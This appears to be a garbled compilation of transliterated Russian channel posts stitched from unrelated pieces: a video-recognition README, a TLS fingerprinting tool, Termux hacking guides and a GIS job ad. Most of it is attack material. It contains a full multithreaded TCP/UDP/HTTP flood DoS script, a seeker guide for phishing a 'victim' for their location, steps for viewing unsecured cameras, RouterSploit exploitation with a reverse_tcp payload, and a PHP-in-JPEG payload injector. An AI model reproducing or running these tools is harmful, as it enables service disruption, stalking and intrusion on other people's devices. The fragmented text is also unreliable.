Networks ECO-Lite autovideo/recognition/eco_primitive.py ECO: Efficient Convolutional Network for Online Video Understanding ECO-Full autovideo/recognition/eco_full_primitive.py ECO: Efficient Convolutional Network for Online Video Understanding I3D autovideo/recognition/i3d_primitive.py Quo Vadis, Action Recognition? A New Model and the Kinetics Dataset  Rasshirennoe Ispol'zovanie  Pomimo privedennykh vyshe primerov, vy takzhe mozhete nastroit' konfiguratsii.  Nastroika giperparametrov  Kazhdaia model' v AutoVideo upakovana v vide primitiva, kotoryi soderzhit nekotorye giperparametry. Primer TSN priveden zdes'. Vse giperparametry mozhno ukazat' pri postroenii konveiera, peredav slovar' konfiguratsii. Vidish' examples/fit.py.  Nastroika prostranstva poiska  Tiuner budet iskat' luchshie kombinatsii giperparametrov v ramkakh poiskovoi sistemy dlia povysheniia proizvoditel'nosti. Prostranstvo poiska mozhno opredelit' s pomoshch'iu nastroiki lucha. Vidish' examples/search.py.  Podgotovka naborov dannykh i sravnitel'nyi analiz  Nabory dannykh dolzhny sootvetstvovat' formatu d3m, kotoryi sostoit iz faila csv i papki mul'timedia. Fail csv dolzhen soderzhat' tri stolbtsa dlia ukazaniia indeksov ekzempliarov, imen videofailov i metok. Primer priveden nizhe  d3mIndex,video,label 0,Aussie_Brunette_Brushing_Hair_II_brush_hair_u_nm_np1_ri_med_3.avi,0 1,brush_my_hair_without_wearing_the_glasses_brush_hair_u_nm_np1_fr_goo_2.avi,0 2,Brushing_my_waist_lenth_hair_brush_hair_u_nm_np1_ba_goo_0.avi,0 3,brushing_raychel_s_hair_brush_hair_u_cm_np2_ri_goo_2.avi,0 4,Brushing_Her_Hair__[_NEW_AUDIO_]_UPDATED!!!!_brush_hair_h_cm_np1_le_goo_1.avi,0 5,Haarek_mmen_brush_hair_h_cm_np1_fr_goo_0.avi,0 6,Haarek_mmen_brush_hair_h_cm_np1_fr_goo_1.avi,0 7,Prelinger_HabitPat1954_brush_hair_h_nm_np1_fr_med_26.avi,0 8,brushing_hair_2_brush_hair_h_nm_np1_ba_med_2.avi,0   Papka mul'timedia dolzhna soderzhat' videofaily. Vy mozhete obratit'sia k nashemu primeru nabora dannykh hmdb6 na Google Diske. My takzhe podgotovili hmdb51 i ucf101 v Google Diske dlia sravnitel'nogo analiza. Pozhaluista, prochitaite benchmark dlia polucheniia bolee podrobnoi informatsii. Dlia nekotorykh algoritmov (C3D, R2P1D i R3D), esli vy khotite zagruzit' predvaritel'no obuchennye vesa i vypolnit' tochnuiu nastroiku, vam neobkhodimo zagruzit' vesa s Google Diska i pomestit' ikh v vesa. and put it to weights.  #raspoznavanieobrazov

Please read the initial JARM blog post for more information.  JARM is an active Transport Layer Security (TLS) server fingerprinting tool.  JARM fingerprints can be used to:    Quickly verify that all servers in a group have the same TLS configuration.  Group disparate servers on the internet by configuration, identifying that a server may belong to Google vs. Salesforce vs. Apple, for example.  Identify default applications or infrastructure.  Identify malware command and control infrastructure and other malicious servers on the Internet.    JARM support has been or is being added to:SecurityTrailsShodanBinaryEdgeRiskIQPalo Alto NetworksCensys360Run JARMpython3 jarm.py [-h] [-i INPUT] [-p PORT] [-v] [-V] [-o OUTPUT] [-j] [-P PROXY] [domain/IP]Example:% python3 jarm.py www.salesforce.comDomain: www.salesforce.comResolved IP: 23.50.225.123JARM: 2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5  To use it with Python 2 you'll need the ipaddress module:  pip install -r requirements... #jarm #packets #python #python3 #sha256 #tls

Poluchenie dostupa k kameram bez parolia:  23 ianvaria 2020 ot Termux - one   Nikhao! Segodnia ia prodemonstriruiu vam, kak mozhno poluchit' dostup k kameram videonabliudeniia bez parolia cherez Termux. Etot material neset oznakomitel'nyi kharakter. Ia vas ni k chemu ne prizyvaiu! Zadacha stat'i lish' razvlekat'. apt update && apt upgrade  apt install git python2 pip2 install requests git clone https://github.com/AngelSecurityTeam/Cam-Hackers cd Cam-Hackers python3 cam-hackers.py Dalee, budet sleduiushchaia kartina, gde nado ukazat' nomer zhelaemoi strany. Posle etogo otkroetsia tselyi spisok, gde dostatochno prosto skopirovat' url (kod v kovychkakh, kotoryi nachinaetsia s http) i vstavit' v stroku brauzera.

Tochnoe mestopolozhenie:  26 dekabria 2020 ot Termux, please Vsem privet, segodnia my s vami pogovorim o tom kak zhe uznat' tochno mestopolozhenie cheloveka, nakhodias' v internete?  V etom nam pomozhet takaia utilita kak seeker. Ego kontseptsiia ochen' prosta, on sozdaet "fishingovuiu" ssylku, kotoraia zaprashivaet mestopolozhenie, i vaulia. Mestopolozhenie zhertvy u nas. No ne vsio tak prosto, kak zvuchit, po krainei mere est' odna problema - kak zastavit' cheloveka pereiti po ssylke ? Eto uzhe vsio zavisit ot vashego myshleniia, i znaniia SI. Itak, davaite po poriadku razberemsia.  1.Ustanovka Pervym delom my obnovliaem pakety: pkg update pkg upgrade Teper' skachivaem neobkhodimye nam instrumenty: pkg install git pkg install openssh Nu a dal'she ostaetsia samoe prostoe, eto skachat' instrument i zapustit' avtomaticheskuiu ustanovku : git clone https://github.com/thewhiteh4t/seeker.git cd seeker/ chmod 777 termux_install.sh ./termux_install.sh Posle uspeshnoi ustanovki my zapuskaem sam instrument : python3 seeker.py I tut my opiat' stalkivaemsia s problemoi. Seichas ob'iasniu. My zapustili siker, no dlia ego ispol'zovanie nuzhno ves' trafik perevodit' v internet (nubskimi slovami). Dlia etogo est' dva instrumenta - eto Ngrok, i Serveo.  Ia pokazhu kak sdelat' vsio na serveo, potomu chto aktivno pol'zuius' im.  Dlia etogo my otkryvaem vtoruiu sessiiu v termuks i vvodim odnu komandu: ssh -R 80:localhost:8080 ssh.localhost.run Gotovo teper' kopiruem ssylku iz vtoroi sessii, gde my sobstvenno sdelali nekii tunel', i kidaem zhertve. (p.s esli ne budet rabotat', vkliuchite VPN)  Rezul'tat budet primerno takoi : Programma nam vydaiot, operatsionnuiu sistemu, aipi, koordinaty, i ssylka na gugl karty, dumaiu tut vsio poniatno) No na etom eshche ne vsio, budet tak zhe vtoraia chast', gde my krasivo oformim dannyi fishingovyi sait, i esli vy zadaetes' vopros, chto pochemu pochti v kazhdoi stat'e ia delaiu vtoruiu chast', otvet na nego prost - chtoby meshat' kontent, komu-to nraviatsia bombery,  a komu-to eto, ia rabota dlia vas, spasibo za ponimanie)

Kod: # -*- coding: utf-8 -*- import urllib.request import os import sys from scapy.all import * #otlichnaia liba from bs4 import BeautifulSoup # Importiruem liby import socket import socks import argparse import threading import random import re Teper' ukazhem avtora programmy)) Kod: __author__ = "username" Vvedem peremennye, neobkhodimye dlia raboty programmy: Kod: sites = ["https://www.socks-proxy.net/","http://free-proxy-list.net/"] #Saity otkuda berem proksi useragents = [] ##Moshchnost' DoS-a zavisit ot vashego internet soedeneniia!!! multiple = 70 # Umnozhenie, znachenie mozhno meniat' threads = 800 # Kol-vo potokov, mozhno meniat' choice1 = 0 #Dlia nastroiki tipa fluda choice2 = 0 #Dlia nastroiki tipa fluda choice3 = 0 #Dlia nastroiki tipa fluda port = 80 # Port kuda budut slat'sia zarosy, mozhno meniat' Takzhe khochu otmetit', chto moshchnost' DoS-a zavisit ot vashego internet soedineniia i kachestva proksi! Chtoby povysit' moshchnost' vy mozhete meniat' znachenie peremennykh multiple i threads Dobavim v nashu programmu argumenty: Kod: ##### Dobavliaem v programmu argumenty parser = argparse.ArgumentParser() parser.add_argument('-useragent', help = 'Put' do faila s user-agentami') parser.add_argument('-proxylist', help = 'Put' do faila s proxy') parser.add_argument('-url', help = 'Tsel'') parser.add_argument('-getproxy', help = 'Poluchit' proksi? 1 - da | 0 - net') args = parser.parse_args() useragents_file = args.useragent needproxy = args.getproxy url = args.url proxies_list = args.proxylist if proxies_list == "": # Esli proksi ne ukazana zakryt' programmu print("Ukazhi proksi!") exit() if useragents_file == "": # Esli useragent-y ne ukazany zakryt' programmu print("Ukazhi useragent-ov!") exit() proxies = open(proxies_list).readlines() # Chitaem proksi ##### Propishem poluchenie useragent-ov s faila: Kod: ###### Poluchenie iuzer agenta s faila handle = open(useragents_file) for x in handle: useragents.append(x) useragents = map(lambda s: s.strip(), useragents) useragents = list(useragents) ###### Napishem funktsiiu, kotoraia budet podgoniat' vvedennyi pol'zovatelem URL pod nashu programmu: Kod: def checkURL(): #Redaktiruem URL global url global url2 global urlport try: if url[0]+url[1]+url[2]+url[3] == "www.": url = "http://" + url elif url[0]+url[1]+url[2]+url[3] == "http": pass else: url = "http://" + url except: print("Oshibka!") exit() try: url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0] except: url2 = url.replace("http://", "").replace("https://", "").split("/")[0] try: urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1] except: urlport = "80" Dlia raboty programmy nuzhny proksi, napishem funktsiiu ikh polucheniia: Kod: def getPROXY(urlproxy): try: req = urllib.request.Request(("{0}").format(str(urlproxy))) req.add_header("User-Agent", random.choice(useragents)) sourcecode = urllib.request.urlopen(req) part = str(sourcecode.read()) part = part.split("") part = part[1].split("") part = part[0].split("") proxies = "" for proxy in part: proxy = proxy.split("") #Poluchaem proksi s saita putem razdeleniia tegov try: proxies=proxies + proxy[0] + ":" + proxy[1] + " " except: pass handle = open("proxy.txt","a") #Zapisuem poluchennye proksi v fail handle.write("") handle.write(proxies) handle.close() print ("Proksi skachany uspeshno!") except: print ("Oshibka!") Pol'zovatel' budet ukazyvat', nuzhno li kachat' proksi, poetomu sdelaem proverku: Kod: if needproxy == "1": # Nuzhno li kachat' proksi? #### Poluchenie proksei for x in sites: getPROXY(x) #### Teper' davaite napishem funktsiiu, kotoraia budet opredeliat' kakoi tip fluda nuzhen pol'zovateliu(mozhno eto bylo sdelat' i cherez argumenty, no ia reshil sdelat' tak))) ): Kod: def typeflood(): # Opredeliaem tip fluda global choice1 #Dlia saitov samyi sil'nyi - HTTP global choice2 global choice3 select = input("UDP ili TCP ili HTTP? => ") if select == "TCP": choice1 = "1" # Iznachal'no programma byla v interaktivnom rezhime choice2 = "y" # No ia ubral ego, ostaviv lish' vybor metoda fluda choice3 = "0" # Poetomu peremennye nazyvaiutsia choice)) if select == "UDP": choice1 = "2" choice2 = "y" #Testit' moshch' vashe DoS-a ili DDoS-a mozhno zdes': https://www.vedbex.com/tools/dstat choice3 = "0" if select == "HTTP": choice1 = "0" choice2 = "y" choice3 = "0" Dumaiu 3-ekh metodov dostatochno. Accept-Charset: iso-8859-1 ", ] # zagolovok Accept peredaetsia sluchainym obrazom, chtoby zaprosy kazalis' legitimnymi connection = "Connection: Keep-Alive " # x = 0 # dlia scheta go = threading.Event() if choice1 == "1": # Vybiraem TCP flud if choice2 == "y": if choice3 == "0": for x in range(threads): TcpFloodProxed(x+1).start() # zapusk klassa print ("Potok " + str(x) + " gotov!") go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy else: # Vybiraem UDP flud if choice1 == "2": if choice2 == "y": if choice3 == "0": for x in range(threads): UdpFloodProxed(x+1).start() # zapusk klassa print ("Potok " + str(x) + " gotov!") go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy else: # Vybiraem HTTP flud if choice2 == "y": if choice3 == "0": for x in range(threads): RequestProxyHTTP(x+1).start() # zapusk klassa print ("Potok " + str(x) + " gotov!") go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy Seichas nachinaetsia samoe interesnoe, pishem sami metody fluda. Reshil ispol'zovat' klassy: Kod: class TcpFloodProxed(threading.Thread): # klass mnogopotochnosti def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi threading.Thread.__init__(self) self.counter = counter def run(self): # funktsiia, kotoraia daet instruktsii dlia potokov data = random._urandom(1024) # randomnaia data dlia paketa p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # postroenie paketa tcp + data current = x # tekushchii potok if current < len(proxies): # esli potok mozhet sviazat'sia s proksi, etot proksi ispol'zuetsia proxy = proxies[current].strip().split(':') else: # v protivnom sluchae vybiraetsia drugoe proksi proxy = random.choice(proxies).strip().split(":") go.wait() # ozhidanie, poka vse proksi budut gotovy while True: try: socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # komanda dlia HTTP-proksirovaniia s = socks.socksocket() # sozdanie soketa s.connect((str(url2),int(port))) # podkliuchenie s.send(p) # otpravka print ("Zapros otpravlen s " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # vyvod req + counter try: # otpravliat' drugie zaprosy v etom zhe potoke for y in range(multiple): # koeffitsient umnozheniia s.send(str.encode(p)) # kodiruem zapros v baity except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia s.close() Propisuem UDP flud: Kod: class UdpFloodProxed(threading.Thread): # klass mnogopotochnosti def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi threading.Thread.__init__(self) self.counter = counter def run(self): # funktsiia, kotoraia daet instruktsii dlia potokov data = random._urandom(1024) # randomnaia data dlia paketa p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # postroenie paketa udp (klassika) current = x # tekushchii potok if current < len(proxies): # esli potok mozhet sviazat'sia s proksi, etot proksi ispol'zuetsia proxy = proxies[current].strip().split(':') else: # v protivnom sluchae vybiraetsia drugoe proksi proxy = random.choice(proxies).strip().split(":") go.wait() # ozhidanie, poka vse proksi budut gotovy while True: try: socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # komanda dlia HTTP-proksirovaniia s = socks.socksocket() # sozdanie soketa s.connect((str(url2),int(port))) # podkliuchenie s.send(p) # otpravka print ("Zapros otpravlen s " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # vyvod req + counter try: # otpravliat' drugie zaprosy v etom zhe potoke for y in range(multiple): # koeffitsient umnozheniia s.send(str.encode(p)) # kodiruem zapros v baity except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia s.close() except: s.close() # esli chto-to poidet ne tak, zakryt' potok i nachat' zanovo Pishem HTTP flud: Kod: class RequestProxyHTTP(threading.Thread): # klass mnogopotochnosti def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi threading.Thread.__init__(self) self.counter = counter def run(self): # funktsiia, kotoraia daet instruktsii dlia potokov useragent = "User-Agent: " + random.choice(useragents) + " " # vybor randomnogo useragent-a accept = random.choice(acceptall) # vybor randomnogo zagolovka "Accept" randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) forward = "X-Forwarded-For: " + randomip + " " # X-Forwarded-For dobavliaem zagolovok, kotoryi povysit nam anonimnost' request = get_host + useragent + accept + forward + connection + " " # sozdaem konechnyi zapros current = x # tekushchii potok if current < len(proxies): # esli potok mozhet sviazat'sia s proksi, etot proksi ispol'zuetsia proxy = proxies[current].strip().split(':') else: # v protivnom sluchae vybiraetsia drugoe proksi proxy = random.choice(proxies).strip().split(":") go.wait() # ozhidanie, poka vse proksi budut gotovy while True: # beskonechnyi tsikl try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # sozdaem soket s.connect((str(proxy[0]), int(proxy[1]))) # konnektimsia k proksi s.send(str.encode(request)) # kodiruem zapros v baity print ("Zapros otpravlen s " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # vyvod req + counter try: # otpravliat' drugie zaprosy v etom zhe potoke for y in range(multiple): # koeffitsient umnozheniia s.send(str.encode(request)) # kodiruem zapros v baity except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia s.close() except: s.close() # esli chto-to poidet ne tak, zakryt' potok i nachat' zanovo Kod: if __name__ == '__main__': # Esli programma zapushchena kak samostoiatel'naia, to zapuskaem eti funktsii checkURL() typeflood() loop() Programma rabotaet kak na windows tak i na linux. Injects php payloads into jpeg images. Related to this post.  Use CaseYou have a web application that runs a jpeg image through PHP's GD graphics library.  DescriptionThis script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image. Make sure your input jpeg is uncompressed!Usagepython3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT_JPEG]  e.g. python3 gd-jpeg.py cat.jpeg '' infected_cat.jpeg  How it worksPHP code is injected in the null/garbage (brown) space after the scan header:    The new infected jpeg is run through PHP's gd-library. PHP interprets the payload injected in the jpeg and executes it.   #payload #payloads #php #php-jpeg-injector #python3 #scan

Pria chem fai ly v kar tinkakh: sem' ste ganog rafiches kikh uti lit dlia Windows>>. Odna ko v nei perechis leny daleko ne vse uti lity i pri tsel sde lan na Windows. Segod nia my ras smot rim vosem' al' ter nativ nykh uti lit, v osnovnom -- kross-plat formen nye. Cloakify Plat forma: liubaia Gde ska chivat': GitHub CloakifyFactory -- eto bol' shaia i leg ko ras shiria emaia prog ramma, kotoraia ispol' zuet skrip ty Cloakify Toolset. Oso ben nost' ee v tom, chto pered mas kirov koi nag ruzki ona kodiru etsia v Base64. U prog rammy est' ogromnyi plius -- ona ume et mas kirovat' chto ugod no ne pros to v kar tinkakh, a eshche i v video, muzyke i dazhe prog rammakh, khot' i s pos ledni mi polucha etsia plo kho -- vykhod noi fail sil' no raz duva etsia. Ra bota et Cloakify na Python 2.7, kotoryi uzhe moral' no i fiziches ki usta rel, a ispol' zovanie Base64 dlia skry tiia informa tsii ot nevo oru zhen nogo gla za pri vodit k sil' nomu uve liche niiu raz mera, ne davaia nikako go zamet nogo pre imu shches tva. Dlia pri mera davai obych nyi tek sto vyi dokument vned rim v kar tinku for mata JPG. Moi iskhodnyi fail nazyva etsia save.txt i lezhit v odnoi direk torii s samoi prog rammoi. Vned renie fai la krai ne pros toe i vyg liadit pri mer no tak. Pro pus kaem fun ktsiiu dobav leniia shumov. Dlia nas oni pogody ne sde laiut, no, esli ty khochesh' dopol nitel' no zamas kirovat' informa tsiiu, mogut pomoch'. Kak ty uzhe mog dogadat' sia, etot soft dlia sok rytiia dei stvi tel' no sek retnoi informa tsii pri meniat' strem no. No est' i pliu sy, vro de pros toty raboty i togo, chto vykhod nykh for matov chut' bolee chem kucha. Steghide Plat forma: liubaia Gde ska chivat': GitHub Steghide -- kon sol' naia uti lita, napisan naia na C++. Skry vaet informa tsiiu v stan dar tnykh fai lakh for matov JPEG, BMP, WAV i AU. V arse nale prog rammy pol no shif rov -- dazhe Blowfish, kotoro go ia u dru gikh ne zamechal. Teore tiches ki ispol' zovanie takoi ekzo tiki mozhet pomoch' zaputat' sle dy eshche sil' nee. Steghide ume et ne pros to upa kovy vat' dan nye v kar tinku ili trek, a eshche i shif rovat' sek retnuiu nag ruzku. No est' i minus: ne vse fotog rafii i audi ofai ly podoi dut dlia vned reniia v nikh sek retnoi nag ruzki. Esli fail slish kom malen' kii -- vned rit' v nego nichego nel' zia. Da vai pop robu em ob' edi nit' kar tinku cats.jpg i sek retnyi fai lik save.txt. Ot kry vaem ter minal i pishem: steghide embed -cf cats. jpg -ef save. txt --embedfile [-ef] -- fail, kotoryi my budem vstra ivat'; --coverfile [-cf] -- fail-oblozhka, v kotoryi vned riaet sia sek retnaia infa; --compress [-z] -- szhi mat' dan nye pered upa kov koi; --encryption [-e] -- shif rovat' vned riaemye dan nye. Ras pakov ka tak zhe pros ta, kak upa kov ka: steghide extract -sf cats. jpg Kliuch --stegofile [-sf] poz volia et vyb rat' fail so skry toi informa tsiei, a --passphrase [-p] uka zyva et parol'. Vot chto poluchi los'Iz-za pri mene niia szha tiia raz nitsa raz merov do i pos le vned reniia minimal' na. Mne pon ravilas' voz mozhnost' sta vit' paroli i szhi mat' dan nye. Odnoznach no khoroshaia shtu ka, kotoruiu mozh no ispol' zovat' v liubitel' skikh tseliakh. K tomu zhe mozh no soz dat' tsepoch ku iz ob' ektov, kotorye budut spria tany drug v dru ge. A minus tol' ko v tom, chto ne vsia koe izob razhenie pod khodit dlia etoi manipu liatsii, no my zhe zhivem v XXI veke, i nai ti novuiu fot ku voob shche ne vop ros, prav da? Spectrology Plat forma: liubaia Gde ska chivat': GitHub Naz vanie prog rammy Spectrology govorit samo za sebia -- ona poz volia et prev rashchat' izob razheniia v audi odo rozh ki s <<zariazhen nymi>> spek trog ramma mi, iz kotorykh potom mozh no dos tat' kar tinki. Zvu chit kru to, no bez prob lem ne obosh los'. Pe red per vym zapus kom nuzh no pos tavit' modul' pillow. python3 -m pip install --upgrade pip python3 -m pip install --upgrade Pillow Sra zu bro saet sia v gla za vto roi ogromnyi minus -- krai ne med lennaia rabota. Khot' on i s likh voi perek ryva etsia pliu sami v vide neobych nogo algo rit ma raboty i pereno simos ti (napisa na na Python). Da vai zapaku em izob razhenie BMP v fail WAV. Dela etsia eto tak: python spectrology. py yourl filename. bmp -o music. wav --output [-o] -- flag, otve chaiushchii za naz vanie vykhod nogo audi ofai la; --botton [-b] zada et nizh nii chas totnyi diapa zon; --pixels [-p] poz volia et usta novit' koliches tvo pik selei v sekun du; --sampling [-s] sta vit chas totu dis kre tiza tsii. Da vai pos motrim, kakogo raz mera budet gotovyi audi ofail. V tselom rabota et med lenno i iz korob ki dazhe ne zapus kaet sia -- pri khodit sia nedos taiushchie moduli sta vit' vruch nuiu. Ne pro izvo dit vpe chat leniia khorosho pro rabo tan nogo ins tru men ta, khotia zadum ka, bezus lovno, klas snaia. ImageSpyer G2 Plat forma: Windows Gde ska chivat': gde poluchit sia Eto odna iz drev nikh uti lit, kog da-to napisan nykh Alek san drom Mias nikovym i nyne vstre chaiushchaiasia lish' na pros torakh fai lopomo ek. Ofi tsial' nyi sait u nee esli kog da-to i byl, to dav no ne rabota et. Tem ne menee prog ramma zas luzhiva et vni maniia.
Dobavliaem v Linux global'nyi poisk v meniushkakh prog, kak v Blender, Sublime Text, VS Code i tp   http://vk.com/@h360ru-hud-globalnyi-poisk-v-linux #linux vs #windows #hud #ui #interfeis

Vzlom routerov:  25 dekabria 2020 ot Termux, please Vsem privet, segodnia my s vami pogovorim ob routersploit. Daaa, ustanovka etoi utility, menia prosto vybesila, ibo routersploit vrode ustanovilsia, no pri skanirovanii prilozhenie krashitsia, nu seichas my eto obgovorim.  Routersploit - eto freimvork, rabota kotorogo zakliuchaetsia v ekspluatatsii/testirovanii besprovodnykh ustroistv,routerov, i td. Exploits - moduli ispol'zuiushchie uiazvimosti. Scanners - moduli ,kotorye pozvoliaiut skanirovat' set' na to : uiazvima ona, ili net. Itak, teper' davaite ustanovim sei prekrasnuiu utilitu, budet dva sposoba, kazhdyi izuchite: 1.Sposob ustanovki Routersploit: Etot sposob, iavliaetsia pervonachal'nym osnovnym, on u menia ne podoshel, no vy mozhete ego poprobovat' : pkg update pkg upgrade pkg install git python pip install --upgrade pip git clone https://www.github.com/threat9/routersploit cd routersploit python3 -m pip install -r requirements.txt python3 -m pip install -r requirements-dev.txt python3 rsf.py Instruktsiiu vzial s etogo zhe gita, no u menia ne srabotal dannyi sposob, tak chto perekhodim ko vtoromu. 2.Sposob ustanovki Routersploit: pkg update pkg upgrade pkg install python pip install future apt install git filget git clone https://github.com/41Team/RouterSploitTermux cd RouterSploitTermux bash run.sh Ustanovka budet dolgoi, dol'she 20 minut eto tochno, tak chto zapasites' terpeniem) Teper' zapusk : cd $HOME cd routersploit python rsf.py Teper' nemnogo razberemsia v utilite: Dannaia utilita soderzhit mnozhestvo eksploitov, v direktorii utility est' papka docs v kotorykh soderzhitsia nebol'shoe opisanie ob eksploite i td. A tak-zhe mozhno prosmotret' spisok vsekh eksploitov komandoi show all 1. Proverka , uiazvim li router ? V etom punkte , my sdelaem skanirovanie gde i vyiasnim uiazvim router ili net, esli da to kakaia uiazvimost' : use scanners/autopwn set target ip routera exploit Pervoi komandoi my vybrali skaner, vtoroi zadali tsel', i tret'ei zapustili skanirovanie. 2.Ataka Esli vsio taki u vas naidetsia uiazvimost'(vy poimete, tam budet tablichka ), to vypolniaem sleduiushchie komandy: use exploits/       #svoi eksploit vybiraete show info #pokazat' informatsiiu ob eksploite show options #pokazat' optsii eksploita set target ip routera check run set payload reverse_tcp set lhost vash ip run Itak, pervoi komandoi my vybiraem eksploit, vtoroi i tret'ei smotrim informatsiiu i optsii o nem, chetvertoi zadaem tsel', piatoi my proveriaem , uiazvima li tsel' k takomu eksploitu, ili net? Sed'moi vybiraem poleznuiu nagruzku nu i vos'moi vvodim svoi ip, i rebiat "#" eto kommentarii tam ia inogda pishu poiasnialki. Vsem spasibo za vnimanie, zhdite vtoruiu chast' dannoi tematiki, tam my uzhe na primere pokazhem kak proverit' na zashchishchennost' vash router!

S podkliucheniem UserName.  Nedavno zadumalsia nad tem, chto vdrug kto-to reshit proverit' na samom li dele sozdastsia vredonosnyi fail system.py, i vspomnil, chto ia stolknulsia s opredelennoi problemoi oshibki v avtozagruzke skripta, kotoryi zapuskaet system.py, posle udaleniia poslednego. Seichas ia popytaius' prodemonstrirovat' to, kak rabotaet dannaia vredonosnaia programma i sposob resheniia dannoi problemy putem ee polnogo udaleniia. Pristupim..  I tak, nachnem: 1)  Skachivaem vredonosnuiu programmu dos(kak primer) iz WannaDeauth:  apt install python -y git clone https://github.com/WannaDeauth/dos cd dos chmod -R a+rx *   *Ustanavlivaem vse neobkhodimye moduli*  pip install colorama requests socket time bs4   *Esli vylezaet oshibka*  WARNING: You are using pip version 19.2.3, however version 20.2.4 is available. You should consider upgrading via the 'pip install --upgrade pip' command.   To my obnovliaem pip*  pip install --upgrade pip   *Posle snova ustanavlivaem vse neobkhodimye moduli, kak napisano vyshe. Nuzhno, chtoby programma khot' raz zapustilas', poetomu my vvodim:  python wannados.py   Vse, programma nam bol'she ne prigoditsia. Ona uzhe sdelala vse, chto dolzhna byla: sozdala system.py(i, kak okazalos', eto ne vse). Nazhimaem ctrl + d, chtoby vyiti iz programmy ili perezapuskaem termux  2)  *Ubedimsia, chto skript system.py sushchestvuet*  cd ~ cat /data/data/com.termux/files/usr/bin/system.py   *Esli vyvelsia kod system.py, kak na 1 skrine, to vash termux zarazhen i budet ispol'zovat'sia v botnete, no v kontse posta my izbavimsia ot vredonosnoi programmy  3)  I tak, v dal'neishem budu govorit' sugubo na lichnom opyte. Ia reshil, chto, udaliv system.py, vredonosnaia programma budet polnost'iu udalena s termux'a:  rm /data/data/com.termux/files/usr/bin/system.py   Kak okazalos', tak i est', virus uzhe ne deesposoben, no posle udaleniia skripta, ia otkryl novuiu sessiiu termux'a i uvidel oshibku, kak na 2 skrine. Ia reshil, chto avtor zapisal zapusk vredonosnogo skripta v bash.bashrc, no, proveriv, ponial, chto tam tol'ko moi kastomnye alias'y, da funktsii. Posle ia predprinial posmotret' vse zapushchennye protsessy s momenta vkliucheniia sessii pri pomoshchi lsof i ps, kak na 3 skrine, zapisal eti komandy v bash.bashrc, i uvidel, chto python3.8 zapuskaet fail system.py, a tak zhe to, chto cherez sokety proiskhodit obmen dannymi(socket'y ne vsegda otobrozhaiutsia v lsof)  Bylo ochen' interesno uznat', kakoi skript zapuskaet system.py pri pomoshchi python. Vnachale podumal, chto ne zria kod wannados.py zashifrovan, i, byt' mozhet, on i zapuskaet system.py. Udalil ia direktoriiu dos, no problema ne reshilas'.  4)  Posle etogo ia podumal i reshil poiskat' faily na nalichie v nikh koda s zapuskom system.py(da i voobshche s tekstom system.py) v sistemnykh direktoriiakh:  cd /data/data/com.termux/files/usr grep -r 'system.py' .   *Posle vvoda dannykh kommand budet vyvedeno primerno tozhe samoe, chto i na 4 skrine. Nas interesuet to, chto ia vydelil na skrine. Mm, skript login, kotoryi nakhoditsia v usr/bin zapuskaet system.py, da eshche i v background(&). INTERESTING!!!   Dlia nagliadnosti posmotrim kod login pri pomoshchi nano(5 skrin):  nano /data/data/com.termux/files/usr/bin/login *dlia vykhoda: ctrl +x*   My vidim, chto v 3 stroke skript zapuskaet system.py, a v 4 delaet clear  5)  Chtoby udalit' polnost'iu etu vredonosnuiu programmu nuzhno izbavit'sia ot system.py, a tak zhe ubrat' 3 i 4 stroki iz skripta login. Otredaktirovat' skript login, dumaiu, smozhet kazhdyi   V zakliuchenie khotelos' by skazat', chto nuzhno s ostorozhnost'iu otnosit'sia ko vsem programmam s github'a i drugikh skhozhikh veb-servisov, tak kak ne vsegda programmy, dazhe s takikh krupnykh veb-servisov, iavliaiutsia bezopasnymi.  Poproshu rasprostranit' etot post, chtoby kazhdyi coder ili prosto chelovek, uvlekaiushchiisia IT, linux'om, termux'om etc., byl osvedomlen ob ikh kanale(WannaDeauth), github'e i ikh vredonosnykh programmakh.

Spetsialist GIS Gruppa kompanii (ekologicheskie i promyshlennye proekty, nauchno-tekhnicheskie razrabotki, NIOKR, developerskie proekty, IT proektirovanie i modelirovanie) priglashaet spetsialista GIS.     Obiazannosti:    Kameral'naia obrabotka i deshifrirovanie kosmicheskikh i aerofotosnimkov s primeneniem GIS sistem; Napolnenie/podderzhka baz dannykh na proektakh; Postroenie po dannym afs - modelei, ortofotoplanov, poverkhnostei, topoplanov;    Trebovaniia k kandidatu:  Kartograficheskoe ili smezhnoe obrazovanie; Opyt raboty v kartografii i smezhnykh sferakh ot 2kh-let; Otlichnoe znanie GIS instrumentov QGlS; Obrabotka, analiz i deshifrirovanie kosmicheskikh i aerofotosnimkov s primeneniem sovremennykh spetsializirovannykh GIS sistem; Opyt raboty s SUBD PostgreSQL\postgis, napolnenie\podderzhka BD; Navyki raboty so sleduiushchimi programmnymi produktami budet pliusom- Scanex, SNAP, Photomod, metashape, pix4d, reality capture, Panorama,AutoCAD; Rabota s mestnymi sistemami koordinat, 